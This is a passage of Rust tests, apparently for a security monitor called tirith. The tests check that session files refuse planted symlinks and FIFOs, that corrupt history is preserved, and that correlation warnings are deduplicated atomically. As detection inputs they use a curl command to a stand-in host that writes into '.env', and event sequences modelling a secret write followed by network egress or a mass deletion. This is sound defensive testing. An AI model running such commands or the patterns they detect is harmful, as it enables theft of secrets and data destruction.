            // followed open would create/clobber it instead of the real lock inode.
            let outside = dir.path().join("outside-lock-target");
            std::os::unix::fs::symlink(&outside, &lock_path).expect("plant lock symlink");

            // Drive a locked mutation. The symlinked lock must be refused, so the
            // mutation is skipped: no session data file is written.
            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );

            assert!(
                !path.exists(),
                "a refused symlinked lock must skip the mutation: session file must not be written"
            );
            assert!(
                !outside.exists(),
                "the lock open must not have been followed through the symlink to the sentinel"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// W6: `suppress_check` must prune ALL expired cooldown entries, not only the
    /// key under test, so `cooldowns` cannot grow unbounded across many distinct
    /// rule/target keys in a long-lived session.
    #[cfg(unix)]
    #[test]
    fn suppress_check_prunes_expired_cooldowns_globally() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "prune-cooldowns-session";
            // Seed an EXPIRED cooldown for a DIFFERENT key (far-past expiry).
            with_session_locked(sid, |sw| {
                sw.cooldowns.insert(
                    "old::expired".to_string(),
                    "2000-01-01T00:00:00+00:00".to_string(),
                );
            });
            assert!(load(sid).cooldowns.contains_key("old::expired"));

            // A suppression check for a NEW key must prune the unrelated expired entry.
            suppress_check(sid, "new_rule", None, 3600);
            let after = load(sid).cooldowns;
            assert!(
                !after.contains_key("old::expired"),
                "an expired cooldown for another key must be pruned globally"
            );
            assert!(
                after.keys().any(|k| k.contains("new_rule")),
                "the new key's cooldown is recorded"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: a SYMLINK planted at the session DATA file path must be refused so
    /// the read/write never follows it to a foreign inode. The mutation is skipped:
    /// the symlink target is not written through and the path stays the symlink.
    #[cfg(unix)]
    #[test]
    fn with_session_locked_refuses_symlinked_session_file() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "symlinked-session-file";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // A sentinel OUTSIDE the sessions dir; the session symlink targets it, so a
            // followed read/write would touch it instead of the real session inode.
            let outside = dir.path().join("outside-session-target");
            std::fs::write(&outside, "{}").expect("write sentinel");
            std::os::unix::fs::symlink(&outside, &path).expect("plant session symlink");

            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );

            assert_eq!(
                std::fs::read_to_string(&outside).expect("sentinel readable"),
                "{}",
                "a refused symlinked session file must not be written through to the target"
            );
            assert!(
                std::fs::symlink_metadata(&path)
                    .expect("path meta")
                    .file_type()
                    .is_symlink(),
                "the session path must remain the (refused) symlink, not be replaced"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: `load()` is the PUBLIC read path (`tirith warnings`). A SYMLINK
    /// planted at the session JSON must NOT be followed to a foreign file; the
    /// O_NOFOLLOW open refuses it and `load` returns a fresh (empty) accumulator, so
    /// `tirith warnings` never renders an outside session's contents.
    #[cfg(unix)]
    #[test]
    fn load_refuses_symlinked_session_file() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "symlink-read";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // An OUTSIDE session JSON with a recognizable marker; the session path is
            // a symlink to it. A FOLLOWED read would surface total_warnings = 4242.
            let outside = dir.path().join("outside-session.json");
            std::fs::write(
                &outside,
                r#"{"session_id":"foreign","session_start":"2020-01-01T00:00:00+00:00","total_warnings":4242,"events":[]}"#,
            )
            .expect("write outside session");
            std::os::unix::fs::symlink(&outside, &path).expect("plant session symlink");

            let loaded = load(sid);
            assert_eq!(
                loaded.total_warnings, 0,
                "load() must refuse a symlinked session file, not surface the foreign session"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: `load()` must refuse a NON-REGULAR session file (FIFO / device /
    /// socket) and never block. A FIFO at the session path would hang a plain blocking
    /// read; the no-follow + O_NONBLOCK + regular-file helper returns immediately and
    /// `load` yields a fresh accumulator. (This test would HANG if the fix regressed.)
    #[cfg(unix)]
    #[test]
    fn load_refuses_fifo_session_file() {
        use std::os::unix::ffi::OsStrExt;
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "fifo-read";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // Plant a FIFO at the session path; a blocking read would hang here.
            let c = std::ffi::CString::new(path.as_os_str().as_bytes()).expect("cstring");
            assert_eq!(
                unsafe { libc::mkfifo(c.as_ptr(), 0o600) },
                0,
                "mkfifo failed"
            );

            let loaded = load(sid);
            assert_eq!(
                loaded.total_warnings, 0,
                "a FIFO session file must yield a fresh accumulator, not hang or be read"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: `with_session_locked` (the writer path) must likewise refuse a
    /// NON-REGULAR session file, so a planted FIFO cannot block `record_warning` /
    /// `suppress_check`. The mutation is skipped (no hang; the FIFO is not written
    /// through and the path stays a FIFO).
    #[cfg(unix)]
    #[test]
    fn with_session_locked_refuses_fifo_session_file() {
        use crate::event_buffer::{EventKind, TypedEvent};
        use std::os::unix::ffi::OsStrExt;
        use std::os::unix::fs::FileTypeExt;
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "fifo-write";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            let c = std::ffi::CString::new(path.as_os_str().as_bytes()).expect("cstring");
            assert_eq!(
                unsafe { libc::mkfifo(c.as_ptr(), 0o600) },
                0,
                "mkfifo failed"
            );

            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );

            assert!(
                std::fs::symlink_metadata(&path)
                    .expect("path meta")
                    .file_type()
                    .is_fifo(),
                "the session path must remain the (refused) FIFO; the mutation was skipped"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// A session JSON carrying raw invalid UTF-8 inside a string is corrupt to both
    /// reader and writer. The presentation reader may return a fresh in-memory view,
    /// but the writer must preserve the bytes: this file is imported once as legacy
    /// security history by strict execution-state initialization, and silently
    /// replacing it would convert an unknown-history failure into an authorization.
    #[cfg(unix)]
    #[test]
    fn reader_degrades_but_writer_preserves_invalid_utf8_session() {
        use crate::event_buffer::{EventKind, TypedEvent};
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "invalid-utf8";
            let path = session_state_path(sid).expect("session path");
            std::fs::create_dir_all(path.parent().expect("sessions dir")).expect("mkdir");

            // Structurally valid JSON whose session_id string holds a raw 0xFF byte
            // (invalid UTF-8) plus a recognizable total_warnings = 7.
            let mut corrupt = br#"{"session_id":"x"#.to_vec();
            corrupt.push(0xFF);
            corrupt.extend_from_slice(
                br#"","session_start":"2020-01-01T00:00:00+00:00","total_warnings":7,"events":[]}"#,
            );
            std::fs::write(&path, &corrupt).expect("write corrupt session");

            // READER: load() rejects invalid UTF-8 as corrupt -> fresh.
            assert_eq!(
                load(sid).total_warnings,
                0,
                "reader must treat an invalid-UTF-8 session as corrupt, not surface total=7"
            );

            // WRITER: a best-effort mutation refuses to overwrite the corrupt legacy
            // source. This preserves the fail-closed signal for strict initialization
            // instead of erasing unknown security history.
            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );
            let after = std::fs::read(&path).expect("read preserved session");
            assert_eq!(
                after, corrupt,
                "writer must leave corrupt legacy security history byte-for-byte untouched"
            );
            assert_eq!(
                load(sid).total_warnings,
                0,
                "presentation reads must continue to degrade safely instead of surfacing total=7"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// W7 atomicity: when `correlate_session` returns a fresh hit, the SAME
    /// session record must ALREADY hold both the de-dup signature AND the
    /// `WarningEvent` — with no second call. The previous design marked the
    /// signature in one write and appended the warning event in a separate
    /// best-effort write, so a crash between them dropped the hit from
    /// `tirith warnings` forever. Folding both into one locked mutation closes it.
    #[cfg(unix)]
    #[test]
    fn correlate_session_persists_marker_and_warning_atomically() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let _state_home = TestStateHome::install(dir.path());
        let _audit_log = TestEnvVar::set("TIRITH_LOG", "0");

        let result = std::panic::catch_unwind(|| {
            let session_id = "w7-atomic-correlation";
            // Seed a SecretWrite THEN a strictly-later Network, both inside the
            // 30s window, so `correlate` yields a SecretWriteThenNetwork hit.
            let base = chrono::Utc::now();
            let t_secret = (base - chrono::Duration::seconds(10)).to_rfc3339();
            let t_net = (base - chrono::Duration::seconds(5)).to_rfc3339();
            record_typed_event(
                session_id,
                TypedEvent::new(&t_secret, EventKind::SecretWrite, "secret_file_write"),
            );
            record_typed_event(
                session_id,
                TypedEvent::new(&t_net, EventKind::Network, "network_egress"),
            );

            let policy = crate::policy::Policy::default();
            let hits =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            let hit = hits
                .iter()
                .find(|h| h.rule_id == RuleId::SecretWriteThenNetwork)
                .expect("the seeded sequence must surface a SecretWriteThenNetwork hit");
            let signature = hit.signature.clone();

            // Load the session FRESH (no further correlate call): both the marker
            // and the warning event must already be persisted together.
            let session = load(session_id);
            assert!(
                session
                    .surfaced_correlations
                    .iter()
                    .any(|s| s == &signature),
                "the de-dup signature must be persisted: {:?}",
                session.surfaced_correlations
            );
            assert!(
                session
                    .events
                    .iter()
                    .any(|e| e.rule_id == RuleId::SecretWriteThenNetwork.to_string()),
                "the WarningEvent must be persisted in the SAME record as the marker: {:?}",
                session
                    .events
                    .iter()
                    .map(|e| &e.rule_id)
                    .collect::<Vec<_>>()
            );
            assert_eq!(
                session.total_warnings, 1,
                "the surfaced correlation must bump total_warnings exactly once"
            );

            // And the dedup holds: a second correlate over the same (still in
            // window) ring surfaces nothing and adds no duplicate warning event.
            let again =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            assert!(
                !again
                    .iter()
                    .any(|h| h.rule_id == RuleId::SecretWriteThenNetwork),
                "an already-surfaced correlation must not re-emit"
            );
            let session = load(session_id);
            assert_eq!(
                session
                    .events
                    .iter()
                    .filter(|e| e.rule_id == RuleId::SecretWriteThenNetwork.to_string())
                    .count(),
                1,
                "the warning event must not be duplicated on a re-correlate"
            );
        });

        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// W7 (E3): a surfaced correlation must stay DEDUPED for as long as its source
    /// events remain in the typed-event window, even after MANY other distinct
    /// correlations are surfaced. The previous design capped `surfaced_correlations`
    /// at an INDEPENDENT 100, smaller than the 200-event window: once >100 fresh
    /// hits were surfaced, the original signature was evicted while its SOURCE events
    /// were still in-window and still correlatable, so the next command re-emitted
    /// and double-counted it. Eviction is now lockstep with the event window, so the
    /// original survives. This drives well past the OLD 100 cap to prove it.
    #[cfg(unix)]
    #[test]
    fn surfaced_correlation_not_re_emitted_while_source_events_live() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let _state_home = TestStateHome::install(dir.path());
        let _audit_log = TestEnvVar::set("TIRITH_LOG", "0");

        let result = std::panic::catch_unwind(|| {
            let session_id = "w7-surfaced-retention-e3";
            let policy = crate::policy::Policy::default();
            // Capture a fixed base safely in the future. Correlation deliberately
            // treats a valid future timestamp as live during a local-clock rollback,
            // so this exercises the production rule while remaining deterministic
            // when a contended full-suite run makes 260 fsync-backed mutations take
            // longer than the 20-second mass-deletion window.
            let base = chrono::Utc::now() + chrono::Duration::minutes(5);
            let stamp =
                |ms_before: i64| (base - chrono::Duration::milliseconds(ms_before)).to_rfc3339();

            // 1) Seed and surface the PROTECTED correlation: SecretWrite then a
            //    strictly-later Network, both in-window.
            record_typed_event(
                session_id,
                TypedEvent::new(&stamp(3000), EventKind::SecretWrite, "secret_file_write"),
            );
            record_typed_event(
                session_id,
                TypedEvent::new(&stamp(2900), EventKind::Network, "network_egress"),
            );
            let first =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            let protected_sig = first
                .iter()
                .find(|h| h.rule_id == RuleId::SecretWriteThenNetwork)
                .expect("the seeded secret->network pair must surface once")
                .signature
                .clone();

            // 2) Surface MANY distinct mass-deletion correlations. Each call adds one
            //    more non-build delete (a NEW latest contributing delete), so each
            //    surfaces a fresh signature keyed on that latest timestamp. Drive
            //    past the OLD independent cap (100) so the protected signature would
            //    have been evicted under the old code.
            const DISTINCT_HITS: usize = 130;
            let mut distinct_seen = 0usize;
            for i in 0..DISTINCT_HITS {
                // Spacing keeps timestamps unique and recent (within ~2s of base).
                let t = stamp(2000 - i as i64 * 10);
                record_typed_event(
                    session_id,
                    TypedEvent::new(&t, EventKind::FileDelete, "file_delete")
                        .with_meta("path", &format!("src/burst{i}.rs")),
                );
                let hits = correlate_session(session_id, "rm src/burst.rs", &policy, &[]);
                if hits.iter().any(|h| h.rule_id == RuleId::MassFileDeletion) {
                    distinct_seen += 1;
                }
            }
            assert!(
                distinct_seen > 100,
                "the burst must surface well over the old 100 cap of distinct hits, got {distinct_seen}"
            );

            // 3) The protected signature must STILL be retained (its source events
            //    are still in the 200-event ring), so re-correlating the same
            //    secret->network pair surfaces NOTHING (still deduped).
            let session = load(session_id);
            assert!(
                session
                    .surfaced_correlations
                    .iter()
                    .any(|s| s == &protected_sig),
                "the protected signature must survive lockstep eviction while its \
                 source events remain in-window"
            );
            let secret_events_live = session
                .typed_events
                .iter()
                .filter(|e| e.kind == EventKind::SecretWrite)
                .count();
            assert_eq!(
                secret_events_live, 1,
                "the seeded SecretWrite must still be live in the typed-event ring"
            );
            let again =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            assert!(
                !again
                    .iter()
                    .any(|h| h.rule_id == RuleId::SecretWriteThenNetwork),
                "the already-surfaced correlation must not re-emit while its source \
                 events are still in-window"
            );
        });

        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }
}
